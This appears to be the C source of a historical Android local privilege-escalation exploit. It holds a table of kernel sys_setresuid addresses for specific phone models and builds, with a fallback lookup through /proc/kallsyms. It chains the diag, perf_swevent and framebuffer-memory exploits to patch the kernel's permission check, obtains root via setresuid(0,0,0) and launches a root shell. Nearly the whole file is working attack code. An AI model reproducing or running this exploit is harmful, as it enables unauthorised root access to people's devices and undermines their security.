/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/system_properties.h>
#include <sys/mman.h>

#include "diagexploit/diag.h"
#include "perf_swevent.h"
#include "fb_mem_exploit/fb_mem.h"
#include "kallsyms/kallsyms_in_memory.h"

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int set_sysresuid_address;
} supported_device;

static supported_device supported_devices[] = {
  { "F-03D",            "V24R33Cc"  , 0xc00e838c },
  { "F-11D",            "V21R36A"   , 0xc00fda10 },
  { "F-11D",            "V24R40A"   , 0xc00fda0c },
  { "F-11D",            "V26R42B"   , 0xc00fd9c8 },
  { "F-12C",            "V21"       , 0xc00e5a90 },
  { "IS11N",            "GRJ90"     , 0xc00f0a04 },
  { "IS17SH",           "01.00.03"  , 0xc01b82a4 },
  { "ISW11K",           "145.0.0002", 0xc010ae18 },
  { "URBANO PROGRESSO", "010.0.3000", 0xc0176d40 },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static unsigned long int
get_sys_setresuid_address_from_kallayms(void)
{
  FILE *fp;
  char function[BUFSIZ];
  char symbol;
  uint32_t address;
  int ret;

  fp = fopen("/proc/kallsyms", "r");
  if (!fp) {
    printf("Failed to open /proc/kallsyms due to %s.", strerror(errno));
    return 0;
  }

  while((ret = fscanf(fp, "%x %c %s", &address, &symbol, function)) != EOF) {
    if (!strcmp(function, "sys_setresuid")) {
      fclose(fp);
      return address;
    }
  }
  fclose(fp);

  return 0;
}

static unsigned long int
get_sys_setresuid_address(void)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      return supported_devices[i].set_sysresuid_address;
    }
  }

  printf("%s (%s) is not supported.\n", device, build_id);
  printf("Attempting to detect from /proc/kallsyms...\n");

  return get_sys_setresuid_address_from_kallayms();
}

static unsigned long int
get_sys_setresuid_address_in_memory(void *kernel_memory)
{
  if (!kallsyms_in_memory_init(kernel_memory, 0x1000000)) {
    return 0;
  }
  return kallsyms_in_memory_lookup_name("sys_setresuid");
}

static bool
inject_command(const char *command,
               unsigned long int sys_setresuid_address)
{
  struct diag_values injection_data;

  injection_data.address = sys_setresuid_address;
  injection_data.value = command[0] | (command[1] << 8);

  return diag_inject(&injection_data, 1);
}

static bool
break_sys_setresuid(unsigned long int sys_setresuid_address)
{
  const char beq[] = { 0x00, 0x0a };
  return inject_command(beq, sys_setresuid_address + 0x42);
}

static bool
restore_sys_setresuid(unsigned long int sys_setresuid_address)
{
  const char bne[] = { 0x00, 0x1a };
  return inject_command(bne, sys_setresuid_address + 0x42);
}

static bool
attempt_perf_swevent_exploit(unsigned long int sys_setresuid_address)
{
  int ret;
  if (!break_with_perf_swevent(sys_setresuid_address)) {
    return false;
  }

  ret = setresuid(0, 0, 0);
  restore_with_perf_swevent(sys_setresuid_address);

  return (ret == 0);
}

static bool
attempt_diag_exploit(unsigned long int sys_setresuid_address)
{
  int ret;

  if (!break_sys_setresuid(sys_setresuid_address)) {
    return false;
  }

  ret = setresuid(0, 0, 0);
  restore_sys_setresuid(sys_setresuid_address);

  return (ret == 0);
}

static uint32_t cmp_operation_code = 0xe3500000;
static void*
find_cmp_operation_address_in_sys_setresuid(void *mmap_base_address)
{
  int *cmp_operation;
  void *mapped_sys_setresuid_address;
  unsigned long int sys_setresuid_address = 0;

  sys_setresuid_address = get_sys_setresuid_address_in_memory(mmap_base_address);
  if (!sys_setresuid_address) {
    printf("Failed to get sys_setresuid address due to %s\n", strerror(errno));
    return NULL;
  }

  mapped_sys_setresuid_address = fb_mem_convert_to_mmaped_address((void*)sys_setresuid_address, mmap_base_address);
  cmp_operation = memmem(mapped_sys_setresuid_address, 0x100, &cmp_operation_code, sizeof(cmp_operation_code));

  return cmp_operation;
}

static bool
fb_mem_exploit_callback(void *mmap_base_address, void *user_data)
{
  int ret;
  int *cmp_operation;

  cmp_operation = find_cmp_operation_address_in_sys_setresuid(mmap_base_address);
  if (!cmp_operation) {
    return false;
  }

  if (*cmp_operation == cmp_operation_code) {
    *cmp_operation = cmp_operation_code + 1;
  }

  ret = setresuid(0, 0, 0);

  *cmp_operation = cmp_operation_code;

  return (ret == 0);
}

static bool
attempt_fb_mem_exploit(void)
{
  printf("Attempt fb mem exploit...\n");

  return fb_mem_run_exploit(fb_mem_exploit_callback, NULL);
}

static bool
run_other_exploits(void)
{
  unsigned long int sys_setresuid_address;

  sys_setresuid_address = get_sys_setresuid_address();
  if (!sys_setresuid_address) {
    return false;
  }

  if (attempt_perf_swevent_exploit(sys_setresuid_address)) {
    return true;
  }

  return attempt_diag_exploit(sys_setresuid_address);
}

int
main(int argc, char **argv)
{
  if (!attempt_fb_mem_exploit() && !run_other_exploits()) {
    printf("failed to get root access\n");
    exit(EXIT_FAILURE);
  }

  system("/system/bin/sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
